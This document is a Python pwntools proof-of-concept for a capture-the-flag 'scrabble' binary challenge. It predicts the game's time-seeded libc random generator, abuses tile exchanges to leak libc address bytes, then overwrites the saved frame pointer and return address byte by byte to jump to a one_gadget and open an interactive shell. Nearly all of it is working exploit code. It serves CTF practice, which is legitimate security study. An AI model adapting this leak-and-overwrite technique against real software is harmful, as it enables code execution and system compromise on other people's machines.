# proof of concept for scrabble challenge
# solve rate is about 1%
from pwn import *
from ctypes import CDLL
import time

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
saved_random_vals = []

def rand_mod(x):
	if saved_random_vals:
		v = saved_random_vals.pop(0)
	else:
		v = libc.rand()
	return (v * x) >> 31

def rand_mod_peek(idx, x):
	while len(saved_random_vals) <= idx:
		v = libc.rand()
		saved_random_vals.append(v)
	return (saved_random_vals[idx] * x) >> 31

def peek_exchange_n_from_k(n, k, skip=0):
	n_tiles = (k - n) % 256
	positions = []
	for i in range(n):
		pos = rand_mod_peek(skip + i, n_tiles + 1)
		n_tiles = (n_tiles + 1) % 256
		positions.append(pos)
	return positions

def shuffle(arr):
	length = len(arr)
	for i in range(length - 1):
		j = i + rand_mod(length - i)
		arr[i], arr[j] = arr[j], arr[i]

acceptable_positions = set([*range(0x68)] + [*range(0x80, 0x88)] + [*range(0xa0, 256)])

tile_addr = None
leak_cheat = None
rack = b''
tiles = b''

def try_run():
	global tile_addr, rack, leak_cheat
	tile_addr = None
	leak_cheat = None

	with gdb.debug("./main", api=True) as r:
		def get_rack():
			r.readuntil(b"rack: ")
			rack = r.readline().strip(b'\n')
			return rack
		
		class BypassCheckWord(r.gdb.Breakpoint):
			def __init__(self):
				r.gdb.Breakpoint.__init__(self, "check_word")

			def stop(self):
				global tile_addr, leak_cheat
				if tile_addr is None:
					# removes the 1/16 ambiguity in libc address
					tile_addr = int(r.gdb.parse_and_eval("$rbp")) + 0x1b0
					inferior = r.gdb.selected_inferior()
					mem = inferior.read_memory(tile_addr - 0x10, 16).tobytes()
					leak_cheat = mem[9] & 0xf0
				
				# ok look writing a scrabble ai is a lot of effort
				# most straightforward option is probably to use libquackle for move generation
				r.gdb.execute("set $pc = check_word + 307")
				return False

		BypassCheckWord()
		r.gdb.execute("continue")
		
		rack = get_rack()
		
		cur_time = libc.time()
		for seed in range(cur_time - 50, cur_time + 50):
			libc.srand(seed)

			tiles = list("AAAAAAAAABBCCDDDDEEEEEEEEEEEEFFGGGHHIIIIIIIIIJKLLLLMMNNNNNNOOOOOOOOPPQRRRRRRSSSSTTTTTTUUUUVVWWXYYZ__")

			shuffle(tiles)
			
			if ''.join(sorted(tiles[-7:])) == rack.decode(): break
		else:
			print("no matching seed")
			return
		
		def start_new_game():
			global tiles, rack
			r.sendline(b"resign\x00AAAy")
			tiles = list("AAAAAAAAABBCCDDDDEEEEEEEEEEEEFFGGGHHIIIIIIIIIJKLLLLMMNNNNNNOOOOOOOOPPQRRRRRRSSSSTTTTTTUUUUVVWWXYYZ__")
			shuffle(tiles) # keep up with rng
			rack = get_rack()
		
		def prepare_to_exchange_n(N):
			global rack
			n_exchanges_needed = 0
			while 1:
				# manipulate rng for favorable exchange positions
				positions = peek_exchange_n_from_k(N, 1)
				if all(i in acceptable_positions for i in positions):
					break
				rand_mod(0) # advance rng by 1
				n_exchanges_needed += 1
			
			print(f"{n_exchanges_needed = }")
			
			while n_exchanges_needed > 0:
				to_exchange = rack[:n_exchanges_needed]
				r.sendline(b"exchange " + to_exchange)
				rack = get_rack()
				n_exchanges_needed -= len(to_exchange)
		
			r.sendline(b"move 8H " + rack)
			rack = get_rack()
			r.sendline(b"move 7N " + rack[:1].replace(b'_', b'a'))
			for i in [6,5,4,3,2,1,9,10,11,12,13]:
				rack = get_rack()
				letter = 'H' if i % 2 == 0 else 'B'
				r.sendline(f"move {i}{letter} ".encode() + rack.replace(b'_', b'a'))
		
		def do_exchange_n(n):
			global rack
			prepare_to_exchange_n(n)
			rack = get_rack()
			r.sendline(b"exchange " + rack[-n:])
			for _ in range(n): rand_mod(0) # update rng state
			
			rack_remain = rack[:-n]
			rack = get_rack()
			print(f"prev rack: {rack_remain}, got rack: {rack}, {rack.hex()}")
			
			return rack, rack_remain
		
		# exchange 5 for first two bytes
		(rack, rack_remain) = do_exchange_n(5)
		
		filtered = []
		remain_list = list(rack_remain)
		for i in rack:
			if i in remain_list:
				remain_list.remove(i)
			else:
				filtered.append(i)
		
		assert(len(filtered) == 2)
		if (filtered[0] >> 4) == 7 and (filtered[1] >> 4) == 7:
			print("sad")
			return
		
		if (filtered[0] >> 4) == 7:
			start_byte, second_byte = filtered
		elif (filtered[1] >> 4) == 7:
			second_byte, start_byte = filtered
		else:
			print("???")
			return
		
		print(f"bytes so far: {start_byte:02x}, {second_byte:02x}")
		
		if start_byte not in range(0x7b, 0x80):
			print("sad start byte")
			return
		
		# exchange 6 for third byte
		start_new_game()
		(rack, rack_remain) = do_exchange_n(6)
		
		filtered = [i for i in rack if i not in [*rack_remain, start_byte, second_byte, 0x7f]]
		if len(filtered) != 1:
			print("sad 3")
			return
		
		(third_byte,) = filtered
		print(f"bytes so far: {start_byte:02x}, {second_byte:02x}, {third_byte:02x}")
		
		# exchange 7 for fourth byte
		start_new_game()
		(rack, rack_remain) = do_exchange_n(7)
		
		filtered = [i for i in rack if i not in [*rack_remain, start_byte, second_byte, third_byte, 0x7f]]
		
		if len(rack) != 4:
			print("rack probably contains a newline")
			return
		
		if len(filtered) != 1:
			print("sad 4")
			return
		
		(fourth_byte,) = filtered
		print(f"bytes so far: {start_byte:02x}, {second_byte:02x}, {third_byte:02x}, {fourth_byte:02x}")
		
		leak = (start_byte << 40) | (second_byte << 32) | (third_byte << 24) | (fourth_byte << 16) # 1/16
		
		leak += leak_cheat << 8 # cheat a little
		
		base = leak - 0x21b000
		
		existing_rip = base + 0x29d90
		one_gadget = base + 0xebd43
		writeable_area = base + 0x21b080 # this is probably safe
		
		print(f"{leak = :016x}, {base = :016x}")
		print(f"goal: write {writeable_area:016x} to rbp, turn rip {existing_rip:016x} into one_gadget at {one_gadget:016x}")
		
		def write_byte(b, offset):
			print(f"trying to write 0x{b:02x} at offset 0x{offset:02x}")
			global rack
			start_new_game()
			
			if b > 0x7f: N = 4
			else: N = 5
			
			n_exchanges_needed = 0
			while 1:
				# manipulate rng for favorable exchange positions
				positions = peek_exchange_n_from_k(N, 1)
				if all(i in acceptable_positions for i in positions):
					positions2 = peek_exchange_n_from_k(3, 1, skip=N)
					if positions2[0] == offset and all(i in acceptable_positions for i in positions2[1:]):
						break
				rand_mod(0) # advance rng by 1
				n_exchanges_needed += 1
			
			print(f"{n_exchanges_needed = }")
			
			while n_exchanges_needed > 0:
				to_exchange = rack[:n_exchanges_needed]
				r.sendline(b"exchange " + to_exchange)
				rack = get_rack()
				n_exchanges_needed -= len(to_exchange)
			
			spine = bytearray(12)
			
			spine[7] = rack.replace(b'_', b'a')[0]
			r.sendline(b"move 8H " + rack.replace(b'_', b'a'))
			rack = get_rack()
			spine[6] = rack.replace(b'_', b'a')[0]
			r.sendline(b"move 7H " + rack[:1].replace(b'_', b'a'))
			rack = get_rack()
			r.sendline(b"move 7A " + rack.replace(b'_', b'a'))
			
			for i in [6,5,4,3,2,1,9,10,11,12]:
				rack = get_rack()
				letter = 'H' if i % 2 == 0 else 'B'
				spine[i - 1] = rack.replace(b'_', b'a')[0 if i % 2 == 0 else 6]
				r.sendline(f"move {i}{letter} ".encode() + rack.replace(b'_', b'a'))
			rack = get_rack()
			
			# fill word
			if b > 0x7f:
				r.sendline(b"move H1 " + spine + bytes([0x1, b, 0xff]) + b"exchange")
			else:
				r.sendline(b"move H1 " + spine + bytes([b, 0x7f, 0x7f]) + b"exchange")
			
			rack = get_rack()
			r.sendline(rack[-N:])
			
			rack = get_rack()
			print(f"current rack: {rack}")
			if b > 0x7f:
				r.sendline(b"exchange " + bytes([b, 0x7f, 0xff]))
			else:
				r.sendline(b"exchange " + bytes([b, 0x7f, 0x7f]))
			
			for _ in range(N + 3): rand_mod(0) # update rng state
			
			rack = get_rack()
		
		# write writeable_area
		for i in range(6):
			b = (writeable_area >> (8 * i)) & 0xff
			if b in range(0x61, 0x7b):
				print("extremely sad")
				return
			write_byte(b, 0x90 + i)
		# write one_gadget
		for i in range(6):
			existing = (existing_rip >> (8 * i)) & 0xff
			desired = (one_gadget >> (8 * i)) & 0xff
			if existing != desired:
				if desired in range(0x61, 0x7b):
					print("extremely sad")
					return
				write_byte(desired, 0x98 + i)
		
		r.sendline(b"resign\x00AAAn") # PLEASE WORK
		
		r.interactive()
	return True
while try_run() is None:
	pass